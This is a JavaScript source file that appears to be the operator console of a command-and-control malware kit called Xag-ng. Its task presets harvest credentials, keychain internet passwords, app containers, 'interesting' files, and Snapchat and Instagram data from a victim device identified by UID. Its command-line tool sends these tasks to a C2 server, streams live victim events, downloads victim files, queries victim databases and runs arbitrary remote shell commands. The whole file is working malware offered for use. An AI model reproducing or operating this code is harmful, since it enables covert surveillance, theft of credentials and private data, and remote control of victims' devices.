/* Xag-ng :: c2/tasks.js — task presets + CLI */
    export const PRESETS = {
      ping: [{ op: 'ping' }],
      boot: [{ op: 'boot' }],
      ctx: [{ op: 'ctx.collect' }],
      apps: [{ op: 'ctx.apps', args: { limit: 400 } }],
      creds: [{ op: 'creds.harvest' }],
      keychain: [{ op: 'creds.keychain', args: { cls: 'kSecClassInternetPassword', limit: 200 } }],
      containers: [{ op: 'fs.containers' }],
      interesting: [{ op: 'fs.interesting' }],
      persist: [{ op: 'persist.status' }],
      snap: [{ op: 'snap.harvest' }],
      ig: [{ op: 'ig.harvest' }],
      social: [{ op: 'snap.harvest' }, { op: 'ig.harvest' }],
      full: [{ op: 'boot' }, { op: 'ctx.collect' }, { op: 'creds.harvest' },
             { op: 'fs.containers' }, { op: 'fs.interesting' }, { op: 'snap.harvest' }, { op: 'ig.harvest' }]
    };
    export function build(n) { const p = PRESETS[n]; if (!p) throw new Error('no preset: ' + n); return p; }

    function headers(env) {
      const h = { 'content-type': 'application/json' };
      if (env.XG_ADMIN) h.authorization = 'Bearer ' + env.XG_ADMIN;
      return h;
    }

    if (typeof process !== 'undefined' && process.argv[1] && process.argv[1].endsWith('tasks.js')) {
      const [host, uid, preset, ...rest] = process.argv.slice(2);
      if (!host || !uid || !preset) {
        console.log('usage: node c2/tasks.js https://HOST UID PRESET [args]');
        console.log('presets: ' + Object.keys(PRESETS).join(', '));
        console.log('ad hoc:  sql PATH [SQL] | tables PATH | tree PATH [DEPTH] | sh CMD');
        console.log('         read PATH [OFF] [LEN] | dl PATH [LOCAL] | live | events');
        process.exit(0);
      }
      const H = headers(process.env);
      const api = (p, o) => fetch(host + p, Object.assign({ headers: H }, o || {}));

      const send = async (t) => (await api('/admin/task', { method: 'POST', body: JSON.stringify({ uid, ...t }) })).json();
      const results = async (id) => {
        const r = await api('/admin/log?uid=' + encodeURIComponent(uid) + (id ? '&id=' + id : ''));
        return (await r.json()).rows || [];
      };
      const waitFor = async (id, ms = 40000) => {
        const t0 = Date.now();
        while (Date.now() - t0 < ms) {
          const hit = (await results(id)).find(x => x.id === id);
          if (hit) return hit.body;
          await new Promise(r => setTimeout(r, 800));
        }
        return { id, ok: false, err: 'timeout' };
      };

      if (preset === 'live') {
        console.log('# live: ' + host + ' ' + uid);
        for (;;) {
          const r = await api('/admin/events?uid=' + encodeURIComponent(uid) + '&wait=25000');
          const j = await r.json();
          for (const ev of j.rows || []) {
            if (ev.kind === 'hb') continue;
            console.log(new Date(ev.ts).toISOString() + '  ' + ev.kind + '  ' + JSON.stringify(ev.body));
          }
        }
      }

      if (preset === 'events') {
        const r = await api('/admin/events?uid=' + encodeURIComponent(uid));
        console.log(JSON.stringify((await r.json()).rows || [], null, 2));
        process.exit(0);
      }

      if (preset === 'dl') {
        const remote = rest[0], local = rest[1] || remote.split('/').pop();
        const url = host + '/admin/dl?uid=' + encodeURIComponent(uid) + '&path=' + encodeURIComponent(remote)
          + (rest[2] ? '&off=' + rest[2] : '') + (rest[3] ? '&len=' + rest[3] : '');
        const r = await api(url);
        if (!r.ok) { console.log('fail: ' + r.status + ' ' + (await r.text()).slice(0, 300)); process.exit(1); }
        const { writeFileSync } = await import('node:fs');
        writeFileSync(local, Buffer.from(await r.arrayBuffer()));
        console.log('wrote ' + local);
        process.exit(0);
      }

      let tasks;
      if (preset === 'sql') tasks = [{ op: 'sql.query', args: { path: rest[0], sql: rest[1] || 'SELECT name FROM sqlite_master', max: Number(rest[2] || 200) } }];
      else if (preset === 'tables') tasks = [{ op: 'sql.tables', args: { path: rest[0] } }];
      else if (preset === 'tree') tasks = [{ op: 'fs.tree', args: { path: rest[0], depth: Number(rest[1] || 2) } }];
      else if (preset === 'sh') tasks = [{ op: 'shell', args: { cmd: rest.join(' ') } }];
      else if (preset === 'exec') tasks = [{ op: 'exec', args: { addr: rest[0], args: rest.slice(1) } }];
      else if (preset === 'read') tasks = [{ op: 'fs.read', args: { path: rest[0], off: Number(rest[1] || 0), len: Number(rest[2] || 262144) } }];
      else tasks = build(preset);

      for (const t of tasks) {
        const res = await send(t);
        if (!res.id) { console.log(JSON.stringify(res)); continue; }
        const r = await waitFor(res.id);
        console.log(JSON.stringify({ task: res.id, op: t.op, ...r }, null, 2));
      }
    }
    